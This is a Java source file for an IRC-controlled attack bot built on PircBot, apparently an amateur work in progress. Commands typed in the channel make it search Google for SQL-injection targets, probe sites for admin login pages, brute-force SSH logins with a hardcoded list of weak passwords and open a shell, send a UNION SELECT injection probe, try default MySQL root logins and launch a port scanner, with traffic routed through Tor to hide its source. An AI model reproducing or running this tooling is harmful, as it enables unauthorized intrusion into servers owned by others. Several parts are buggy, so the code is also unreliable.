
package javaapplication1;

import org.jibble.pircbot.*;

import org.jibble.pircbot.User;

import java.util.*;

import java.math.*;

import java.io.BufferedInputStream;

import java.io.DataInputStream;

import java.io.File;

import java.io.FileInputStream;

import java.io.FileNotFoundException;

import java.io.IOException;

import java.net.*;

import java.io.*;

import  sun.audio.*;

import java.sql.*;

import java.sql.Connection;

import java.sql.DriverManager;

import java.sql.ResultSet;

import java.sql.Statement;

import com.jcraft.jsch.*;

import botthread.*; //Importing from the other package.



public class botClass extends PircBot implements Runnable {
    
    sqllite sql = new sqllite();
    
    Thread t;
    
    MyLogger m = new MyLogger(); //Set proxy host and port
    
    boolean wait = false;
    
    long time = 0;
    
    private static String endpointURL = "http://www.google.se/search?q=inrul=php?id=";
    
    public botClass(String name) throws Exception {
        
        t = new Thread(this,"Decepticon");
        
        setName(name);
        
        setVerbose(true);
                
        connect("irc.glowfish.de");
            
        joinChannel("#bottest");
        
        t.start();
          
        if(this.wait == true)
        {
            t.wait(this.time);
        }
        
    }
    
    public void run() {
      
    }
    
    public void onMessage(String channel, String sender, String login, String hostname, String message) {
        
        
        
        try {
        
            
            
 
            if(message.contains("!autobot")) { //Letting one more bot join.
                
               
               sendMessage("#bottest","Starting up Optimus");
               
               sendMessage("#bottest","Sending in optimus");
                
               autobot optimus = new autobot("Optimus"); 
               
                
              
            }
            
           else if(message.equalsIgnoreCase("!Hello"))
            {
                
                setName("Megatroll");
           
                sendMessage("#bottest","Hello "+sender);
           
                return;
        
            }
        
            else if(message.equalsIgnoreCase("u mad?"))
            {
            
            String b = getNick();
            
            sendMessage("#bottest", b + " thinks " + sender + " is mad!!");
            
            return;
        
            }
        
         
          
          else if(message.contains("!sortdb"))
          {
          
              sendMessage("#bottest","Sorting database!");
              
              sql.Sortdb();
          }
          
          
        /*Scan network if hosts is up */
        
       else if(message.contains("!sqlvlns")) { //search google for possible targets for sqli.. Still under construction

                URI uri = new URI("http","google.se","/search?q=","inurl=php?id=",null);
                
                URL url = new URL("http://www.google.se/search?q=crisrians inrul=php?id=");
                
                
                //System.setProperty("http.proxyHost", "localhost"); //Turns out that you can use tor as a proxy for the 
                //http request.. Reminder if you got time.. Change all this settings to a proxy file..
            
                //System.setProperty("http.proxyPort", "8118"); //The hardcoded proxyport
       
                URLConnection uc = new URL(endpointURL).openConnection();
		
                HttpURLConnection connection = (HttpURLConnection) uc;
                
                uc.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1.6) Gecko/20070723 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1)");
		
                connection.setDoOutput(true);
		
                connection.setRequestMethod("GET");
		
                connection.connect();
		
                String line;
		
                InputStream inputStream = null;
                
                try {
			
                    inputStream = connection.getInputStream();
                    
                    BufferedReader rd = new BufferedReader(new InputStreamReader(inputStream));
                    
                    Scanner result10;
                    
                    Scanner result11;
                    
                    while ((line = rd.readLine()) != null) {
                     
                     
                        if(line.contains("q=http://"))
                        {
                        
                        
                            String parts[] = line.split("\\/url?");
                            
                            
                       
                            for(String items :  parts) try {
                                
                                URL url1 = new URL(items);

                                System.out.println("Results " + url1);

                            } catch(MalformedURLException e) {
                                
                                result10 = new Scanner(items.replaceAll("></span>Nyheter</a></li></ul><a", ""));
                                
                                String nItems = result10.next();
                             
                                String nItemsf = nItems.substring(1, nItems.length());
                                
                                String nItemsfd = URLDecoder.decode(nItemsf);
                                
                                sendMessage("#bottest",nItemsfd);
                                
                        }
                     
                           
                
                        }
                    
                    }
                
                }catch (IOException e) {
            
                    inputStream = connection.getErrorStream();
		
                }
                 
       } 
       else if(message.contains("!adm")) { //Searching for the admin page.
            
            Scanner result7 = new Scanner(message.toString().replaceAll("\\!adm",""));
            
            String b8 = result7.next(); //Skalad sträng.
            
            sendMessage("#bottest",b8);
            
            String b9[] = new String[38]; //Tänkbara admm login sidor.
            
            URL u[] = new URL[38];

            HttpURLConnection.setFollowRedirects(false);
            
            HttpURLConnection huc[] = new HttpURLConnection[38];
            
            System.setProperty("http.proxyHost", "localhost"); //Turns out that you can use tor as a proxy for the 
            //http request.. Reminder if you got time.. Change all this settings to a proxy file..
            
            System.setProperty("http.proxyPort", "8118"); //The hardcoded proxyport
            
            b9[0] = "/account.asp";
            b9[1] = "/account.cfm";
            b9[2] = "/account.html";
            b9[3] = "/account.php";
            b9[4] = "/acc_login/";
            b9[5] = "/adm.asp";
            b9[6] = "/adm.cfm";
            b9[9] = "/adm.html";
            b9[10] = "/adm.php";
            b9[11] = "/adm/";
            b9[12] = "/adm/adminloginuser.asp";
            b9[13] = "/adm/adminloginuser.cfm";
            b9[14] = "/adm/adminloginuser.html";
            b9[15] = "/adm/adminloginuser.php";
            b9[16] = "/adm/index.asp";
            b9[17] = "/adm/index.php";
            b9[18] = "/adm/index.html";
            b9[19] = "/adm/index.cfm";
            b9[20] = "/adm/adminloginuser.php";
            b9[21] = "/adm_auth.asp";
            b9[22] = "/adm_auth.cfm";
            b9[23] = "/adm_auth.html";
            b9[24] = "/adm_auth.php";
            b9[25] = "/admin.asp";
            b9[26] = "/admin.cfm";
            b9[27] = "/admin.html";
            b9[28] = "/admin.php";
            b9[29] = "/admin/account.asp";
            b9[30] = "/admin/account.cfm";
            b9[31] = "/admin/account.html";
            b9[29] = "/admin/account.php";
            b9[32] = "/admin/admin.asp";
            b9[33] = "/admin/admin.cfm";
            b9[34] = "/admin/admin.html";
            b9[35] = "/admin/admin.php";
            b9[36] = "/admin/admin_login.asp";
            b9[37] = "/admin/";
           
		try {
            
               
               //sendMessage("#bottest",b9[1]);
           
               for(int i = 0;i<b9.length;i++)
               {
                   u[i] = new URL(b8 + b9[i]);
                
                   sendMessage("#bottest",u[i].toString());
                
                   huc[i] = ( HttpURLConnection )  u[i].openConnection();
                
                   huc[i].setRequestMethod("HEAD");
                
                   if(huc[i].getResponseCode() == HttpURLConnection.HTTP_OK)
                   {
                    
                       sendMessage("#bottest",b9[i] + " <-- Exsists\n");
                    
                   } else {
                    
                       sendMessage("#bottest",b9[i] + " <-- Not exists\n");
                 
                   }
               }
           } catch(MalformedURLException ex) {
                
            sendMessage("#bottest","The page is not valid, Error : " + ex);    
                
            }
            
        }
        
        else if(message.contains("!ssh")) {
            
            String s2 = message.substring(message.lastIndexOf("t")+2,message.length());
            
            Scanner result9 = new Scanner(message.toString().replaceAll("\\!ssh", ""));
            
            String b12 = result9.next(); // Första skalningen.
            
           
            //Vad det gäller proxyn.. Grundinställningarna är i tor.. Innan programmet är 
            //färdigt ska det flyttas över till en configgfil
            
            //String proxy_host = "localhost";
        
            String Login = null;
   
            //int proxy_port = 9050;
            
            String host = s2;
            
            
            JSch jsch = new JSch();
            
            JSch.setLogger(new MyLogger());
        
            Channel channel1[] = new Channel[12];
            
            Session session[] = new Session[12];
               
            String passwd[] = new String[12];
                
            passwd[0] = "root";
            passwd[1] = "password";
            passwd[3] = "love";
            passwd[4] = "sex";
            passwd[5] = "god";
            passwd[6] = "default";
            passwd[7] = "12345678";
            passwd[8] = "passwd";
            
            passwd[9] = "bajs";
            
            passwd[10] = "12345";
            
            
            int i = 0;
               
            sendMessage("#bottest","Connecting to : " + host);
            
            while(i<passwd.length)
                    {
                try{     
     
                   
                    //Starts a session with the host(input by the user)
                
                    session[i] = jsch.getSession(b12, host,22);
          
                    sendMessage("#bottest","testing pass : " + passwd[i]);
                    
                    //Must fix the proxy server.
                   // session[i].setProxy(new ProxySOCKS5(proxy_host,proxy_port));
                    
                    session[i].setConfig("StrictHostKeyChecking", "no");
                
                    session[i].setPassword(passwd[i]);
                
                    session[i].setTimeout(2000);
                    
                    session[i].connect();
                    
                    if(session[i].isConnected())
                    {
                        
                        sendMessage("#bottest","Login successful!");
                        channel1[i] = session[i].openChannel("shell");    
                    
                    } else {
                        
                        sendMessage("#bottest","Login failed");
                        i++;  
                        
                    }
                        
                    i++;  
               
                    
                } catch(Exception e) {
     
                    sendMessage("#bottest","Error : " + e);
           
                    //if(e.equals("com.jcraft.jsch.JSchException: Auth cancel"))
                        i++;
                }
                }
           
               
        }
        
        else if(message.contains("!sqli")) {
            
            System.setProperty("http.proxyHost", "localhost"); //Turns out that you can use tor as a proxy for the 
            //http request.. Reminder if you got time.. Change all this settings to a proxy file..
            
            System.setProperty("http.proxyPort", "8118"); //The hardcoded proxyport
            
            Scanner result9 = new Scanner(message.toString().replaceAll("\\!sqli", ""));
            
            String b13 = "http://" + result9.next(); //Adds the hyper text transfer protocol to the URL.
            
            String b14 = b13 + "'";
            
            String b15[] = new String[11];
            
            URL urlopen = new URL(b13);
            
            URL urlopen1[] = new URL[10];
            
            b15[0] = b14 + "UNION SELECT 1,2,3,4,@@version--"; //The request for the a vulnerable db.
            
            String inputLineReader1[] = new String[10];
            
            BufferedReader in1[] = new BufferedReader[10];
            
            URLConnection uc1[] = new URLConnection[10];
            
            urlopen1[0] = new URL(b15[0]);
            
            try {
                
                sendMessage("#bottest","----------- Starting sqli test --------------");
                
                URLConnection uc = urlopen.openConnection();
                
                BufferedReader in = new BufferedReader(
                                new InputStreamReader(
                                uc.getInputStream()));
                
                String inputLineReader;
               
                while ((inputLineReader = in.readLine()) != null) 
                    if(inputLineReader.contains("Warning: "))
                        sendMessage("#bottest","The site is vulnerable for sqli..");
                        
                
                
                sendMessage("#bottest","The site is not vulnerable for sqli");
                   
                
            }  catch(Exception ex){
            
                 sendMessage("#bottest", "Error" + ex);
        
            }
            
            
        }
        
        else if(message.contains("!sqlm")) { // using jdbc to connect to a mysql database with default logins.
            
            Scanner result5 = new Scanner(message.toString().replaceAll("\\!sqlm",""));
            
            String b5 = result5.next();
            
            String address;
            
            try {
                
                Scanner result6 = new Scanner(b5.replaceAll("\\.php", ""));
                
                String b6 = result6.next();
                
                int lastdot = b6.lastIndexOf(".");
               
                address = b6.substring(0, lastdot+4);
                
                sendMessage("#bottest",address);
                
                Class.forName("com.mysql.jdbc.Driver");
        
                Connection conn = DriverManager.getConnection("jdbc:mysql://"+address+":3306","root","");
    
                Statement stat = conn.createStatement();
        
                ResultSet rs = null;
        
                rs = stat.executeQuery("SELECT VERSION()");
                
                sendMessage("#bottest","Database version : " + rs);

                conn.close();
                
            } catch(Exception e) {
                
                sendMessage("#bottest","Unable to connect or target not vulnerable to sqli. Error : " + e);
                
            }
            
        }
        
        else if(message.contains("!shockwave"))
        {
            
            sendMessage("#bottest","Sending in Shockwave(Portscan,hostScan)");
            
            Shockwave shockwave = new Shockwave();
            
        }
        
        else if(message.contains("!http://")) { //
            
            Scanner result2 = new Scanner(message.toString().replaceAll("\\!", ""));
            
            String b = result2.next();
            
            System.setProperty("http.proxyHost", "localhost"); //Turns out that you can use tor as a proxy for the 
            //http request.. Reminder if you got time.. Change all this settings to a proxy file..
            
            System.setProperty("http.proxyPort", "8118"); //The hardcoded proxyport
            
            try {
            
                Scanner result3 = new Scanner(message.toString().replaceAll("\\!http://", ""));
                
                String b2 = result3.next();
                
                InetAddress ipaddress = InetAddress.getByName(b2);
                
      
                sendMessage("#bottest","Target IP: " + ipaddress.getHostAddress());
                
                sql.Insertdb(ipaddress.getHostAddress(),1);
                
                sendMessage("#bottest","Successfully recorded into the db");
                
                
            } catch ( UnknownHostException e )
    
            {
               sendMessage("#bottest","Could not find IP address for: " + b);
    
            }
            
                    
            
            try{
                
                sendMessage("#bottest","----------Header info -----------------");
                
                URL u = new URL(b);
            
                HttpURLConnection uc = (HttpURLConnection) u.openConnection();
            
                int code = uc.getResponseCode();
            
                String response = uc.getResponseMessage();
            
                sendMessage("#bottest", "HTTP/1.x " + code + " " + response);
            
                for(int j = 1; ; j++){
                
                    String header = uc.getHeaderField(j);
                    
                    String key = uc.getHeaderFieldKey(j);
                
                    if(header == null || key == null)
                        
                        break;
                
                    sendMessage("#bottest",uc.getHeaderFieldKey(j) + ": " + header);
                
                }
                
                sendMessage("#bottest","---------- End of Header info ---------------");
                
               
            }  catch(MalformedURLException ex){
            
                sendMessage("#bottest", "Not vaild URL");
        
            }
              
        }   else if(message.contains("http://")) {
                
            String b = message.toString();
            
            URL urlopen = new URL(b);
            try {
                
             sendMessage("#bottest","----------- Title of the page --------------");
             /*För att läsa en helhemsidas källkod.. Vanlig File inmatning med en buufertstream. */    
             URLConnection uc = urlopen.openConnection();
             
              BufferedReader in = new BufferedReader(
                                new InputStreamReader(
                                uc.getInputStream()));
             
              String inputLineReader;
               
              while ((inputLineReader = in.readLine()) != null) 
                 if(inputLineReader.contains("<title>"))
                      sendMessage("#bottest",inputLineReader);
              
              sendMessage("#bottest","-------------------------------------------");
        
              in.close();
              
             }  catch(MalformedURLException ex){
            
                 sendMessage("#bottest", "Not vaild URL");
        
            }
                
        }
            
        } catch (Exception e) {
        
            System.out.println();
    
        }
    
    } 
}


